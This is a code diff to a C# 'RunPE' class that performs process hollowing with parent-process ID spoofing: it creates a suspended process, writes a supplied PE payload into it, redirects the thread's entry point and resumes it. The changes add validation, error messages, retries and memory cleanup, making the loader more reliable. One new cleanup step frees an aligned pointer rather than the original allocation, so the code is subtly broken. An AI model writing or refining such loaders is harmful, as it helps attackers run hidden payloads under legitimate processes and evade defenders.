@@ -17,15 +17,30 @@ public static class RunPE
 	/// <param name="parentProcessId">The spoofed parent process ID.</param>
 	public static void Run(string path, string commandLine, byte[] payload, int parentProcessId)
 	{
+		// Validate PE file structure before attempting process hollowing
+		if (payload == null || payload.Length < 0x40)
+			throw new ArgumentException("Invalid payload: too small to be a PE file", nameof(payload));
+		if (payload[0] != 'M' || payload[1] != 'Z')
+			throw new ArgumentException("Invalid payload: missing DOS signature", nameof(payload));
+
 		// For 32-bit (and 64-bit?) process hollowing, this needs to be attempted several times.
 		// This is a workaround to the well known stability issue of process hollowing.
 		for (int i = 0; i < 5; i++)
 		{
 			int processId = 0;
+			IntPtr parentProcessHandlePtr = IntPtr.Zero;
+			IntPtr attributeList = IntPtr.Zero;
+			IntPtr startupInfo = IntPtr.Zero;
+			IntPtr context = IntPtr.Zero;
 
 			try
 			{
 				int ntHeaders = BitConverter.ToInt32(payload, 0x3c);
+				
+				// Validate NT headers offset
+				if (ntHeaders < 0 || ntHeaders + 0x18 + 0x3c + 4 > payload.Length)
+					throw new ArgumentException("Invalid payload: NT headers offset out of bounds", nameof(payload));
+
 				int sizeOfImage = BitConverter.ToInt32(payload, ntHeaders + 0x18 + 0x38);
 				int sizeOfHeaders = BitConverter.ToInt32(payload, ntHeaders + 0x18 + 0x3c);
 				int entryPoint = BitConverter.ToInt32(payload, ntHeaders + 0x18 + 0x10);
@@ -34,32 +49,35 @@ public static class RunPE
 				IntPtr imageBase = IntPtr.Size == 4 ? (IntPtr)BitConverter.ToInt32(payload, ntHeaders + 0x18 + 0x1c) : (IntPtr)BitConverter.ToInt64(payload, ntHeaders + 0x18 + 0x18);
 
 				IntPtr parentProcessHandle = OpenProcess(0x80, false, parentProcessId);
-				if (parentProcessHandle == IntPtr.Zero) throw new Exception();
+				if (parentProcessHandle == IntPtr.Zero) throw new InvalidOperationException("Failed to open parent process");
 
-				IntPtr parentProcessHandlePtr = Allocate(IntPtr.Size);
+				parentProcessHandlePtr = Allocate(IntPtr.Size);
 				Marshal.WriteIntPtr(parentProcessHandlePtr, parentProcessHandle);
 
 				IntPtr attributeListSize = IntPtr.Zero;
-				if (InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref attributeListSize) || attributeListSize == IntPtr.Zero) throw new Exception();
+				if (InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref attributeListSize) || attributeListSize == IntPtr.Zero) 
+					throw new InvalidOperationException("Failed to get attribute list size");
 
-				IntPtr attributeList = Allocate((int)attributeListSize);
+				attributeList = Allocate((int)attributeListSize);
 				if (!InitializeProcThreadAttributeList(attributeList, 1, 0, ref attributeListSize) ||
 					attributeList == IntPtr.Zero ||
-					!UpdateProcThreadAttribute(attributeList, 0, (IntPtr)0x20000, parentProcessHandlePtr, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero)) throw new Exception();
+					!UpdateProcThreadAttribute(attributeList, 0, (IntPtr)0x20000, parentProcessHandlePtr, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero)) 
+					throw new InvalidOperationException("Failed to initialize proc thread attributes");
 
 				// Use STARTUPINFOEX to implement parent process spoofing
 				int startupInfoLength = IntPtr.Size == 4 ? 0x48 : 0x70;
-				IntPtr startupInfo = Allocate(startupInfoLength);
+				startupInfo = Allocate(startupInfoLength);
 				Marshal.Copy(new byte[startupInfoLength], 0, startupInfo, startupInfoLength);
 				Marshal.WriteInt32(startupInfo, startupInfoLength);
 				Marshal.WriteIntPtr(startupInfo, startupInfoLength - IntPtr.Size, attributeList);
 
 				byte[] processInfo = new byte[IntPtr.Size == 4 ? 0x10 : 0x18];
 
-				IntPtr context = Allocate(IntPtr.Size == 4 ? 0x2cc : 0x4d0);
+				context = Allocate(IntPtr.Size == 4 ? 0x2cc : 0x4d0);
 				Marshal.WriteInt32(context, IntPtr.Size == 4 ? 0 : 0x30, 0x10001b);
 
-				if (!CreateProcess(path, path + " " + commandLine, IntPtr.Zero, IntPtr.Zero, true, 0x80004, IntPtr.Zero, null, startupInfo, processInfo)) throw new Exception();
+				if (!CreateProcess(path, path + " " + commandLine, IntPtr.Zero, IntPtr.Zero, true, 0x80004, IntPtr.Zero, null, startupInfo, processInfo)) 
+					throw new InvalidOperationException("Failed to create suspended process");
 				processId = BitConverter.ToInt32(processInfo, IntPtr.Size * 2);
 				IntPtr process = IntPtr.Size == 4 ? (IntPtr)BitConverter.ToInt32(processInfo, 0) : (IntPtr)BitConverter.ToInt64(processInfo, 0);
 
@@ -67,54 +85,83 @@ public static class RunPE
 
 				IntPtr sizeOfImagePtr = (IntPtr)sizeOfImage;
 				if (NtAllocateVirtualMemory(process, ref imageBase, IntPtr.Zero, ref sizeOfImagePtr, 0x3000, 0x40) < 0 ||
-					NtWriteVirtualMemory(process, imageBase, payload, sizeOfHeaders, IntPtr.Zero) < 0) throw new Exception();
+					NtWriteVirtualMemory(process, imageBase, payload, sizeOfHeaders, IntPtr.Zero) < 0) 
+					throw new InvalidOperationException("Failed to allocate or write process memory");
 
 				for (short j = 0; j < numberOfSections; j++)
 				{
+					// Validate section header bounds
+					int sectionHeaderOffset = ntHeaders + 0x18 + sizeOfOptionalHeader + j * 0x28;
+					if (sectionHeaderOffset + 0x28 > payload.Length)
+						throw new ArgumentException("Section header out of bounds", nameof(payload));
+
 					byte[] section = new byte[0x28];
-					Buffer.BlockCopy(payload, ntHeaders + 0x18 + sizeOfOptionalHeader + j * 0x28, section, 0, 0x28);
+					Buffer.BlockCopy(payload, sectionHeaderOffset, section, 0, 0x28);
 
 					int virtualAddress = BitConverter.ToInt32(section, 0xc);
 					int sizeOfRawData = BitConverter.ToInt32(section, 0x10);
 					int pointerToRawData = BitConverter.ToInt32(section, 0x14);
 
+					// Validate section data bounds and prevent integer overflow
+					if (sizeOfRawData < 0 || pointerToRawData < 0 || 
+					    pointerToRawData > payload.Length || 
+					    sizeOfRawData > payload.Length - pointerToRawData)
+						throw new ArgumentException("Section data out of bounds", nameof(payload));
+
 					byte[] rawData = new byte[sizeOfRawData];
 					Buffer.BlockCopy(payload, pointerToRawData, rawData, 0, rawData.Length);
 
-					if (NtWriteVirtualMemory(process, (IntPtr)((long)imageBase + virtualAddress), rawData, rawData.Length, IntPtr.Zero) < 0) throw new Exception();
+					if (NtWriteVirtualMemory(process, (IntPtr)((long)imageBase + virtualAddress), rawData, rawData.Length, IntPtr.Zero) < 0) 
+						throw new InvalidOperationException("Failed to write section data");
 				}
 
 				IntPtr thread = IntPtr.Size == 4 ? (IntPtr)BitConverter.ToInt32(processInfo, 4) : (IntPtr)BitConverter.ToInt64(processInfo, 8);
-				if (NtGetContextThread(thread, context) < 0) throw new Exception();
+				if (NtGetContextThread(thread, context) < 0) throw new InvalidOperationException("Failed to get thread context");
 
 				if (IntPtr.Size == 4)
 				{
 					IntPtr ebx = (IntPtr)Marshal.ReadInt32(context, 0xa4);
-					if (NtWriteVirtualMemory(process, (IntPtr)((int)ebx + 8), BitConverter.GetBytes((int)imageBase), 4, IntPtr.Zero) < 0) throw new Exception();
+					if (NtWriteVirtualMemory(process, (IntPtr)((int)ebx + 8), BitConverter.GetBytes((int)imageBase), 4, IntPtr.Zero) < 0) 
+						throw new InvalidOperationException("Failed to write image base to PEB");
 					Marshal.WriteInt32(context, 0xb0, (int)imageBase + entryPoint);
 				}
 				else
 				{
 					IntPtr rdx = (IntPtr)Marshal.ReadInt64(context, 0x88);
-					if (NtWriteVirtualMemory(process, (IntPtr)((long)rdx + 16), BitConverter.GetBytes((long)imageBase), 8, IntPtr.Zero) < 0) throw new Exception();
+					if (NtWriteVirtualMemory(process, (IntPtr)((long)rdx + 16), BitConverter.GetBytes((long)imageBase), 8, IntPtr.Zero) < 0) 
+						throw new InvalidOperationException("Failed to write image base to PEB");
 					Marshal.WriteInt64(context, 0x80, (long)imageBase + entryPoint);
 				}
 
-				if (NtSetContextThread(thread, context) < 0) throw new Exception();
-				if (NtResumeThread(thread, out _) == -1) throw new Exception();
+				if (NtSetContextThread(thread, context) < 0) throw new InvalidOperationException("Failed to set thread context");
+				if (NtResumeThread(thread, out _) == -1) throw new InvalidOperationException("Failed to resume thread");
+				
+				// Success - break out of retry loop
+				break;
 			}
 			catch
 			{
-				try
+				// If the current attempt failed, terminate the created process to not have suspended "leftover" processes.
+				if (processId > 0)
 				{
-					// If the current attempt failed, terminate the created process to not have suspended "leftover" processes.
-					Process.GetProcessById(processId).Kill();
+					try
+					{
+						Process.GetProcessById(processId).Kill();
+					}
+					catch { }
 				}
-				catch { }
-				continue;
+				
+				// Only retry if this isn't the last attempt
+				if (i == 4) throw;
 			}
-
-			break;
+			finally
+			{
+				// Always free allocated memory to prevent leaks
+				if (parentProcessHandlePtr != IntPtr.Zero) Marshal.FreeHGlobal(parentProcessHandlePtr);
+				if (attributeList != IntPtr.Zero) Marshal.FreeHGlobal(attributeList);
+				if (startupInfo != IntPtr.Zero) Marshal.FreeHGlobal(startupInfo);
+				if (context != IntPtr.Zero) Marshal.FreeHGlobal(context);
+			}
 		}
 	}
 
@@ -126,7 +173,17 @@ public static class RunPE
 	private static IntPtr Allocate(int size)
 	{
 		int alignment = IntPtr.Size == 4 ? 1 : 16;
-		return (IntPtr)(((long)Marshal.AllocHGlobal(size + alignment / 2) + (alignment - 1)) / alignment * alignment);
+		if (alignment == 1)
+		{
+			// No alignment needed for 32-bit
+			return Marshal.AllocHGlobal(size);
+		}
+		else
+		{
+			// Allocate extra space for alignment, then align the pointer
+			IntPtr unaligned = Marshal.AllocHGlobal(size + alignment - 1);
+			return (IntPtr)(((long)unaligned + (alignment - 1)) & ~(alignment - 1));
+		}
 	}
 
 	[DllImport("kernel32.dll", SetLastError = true)]
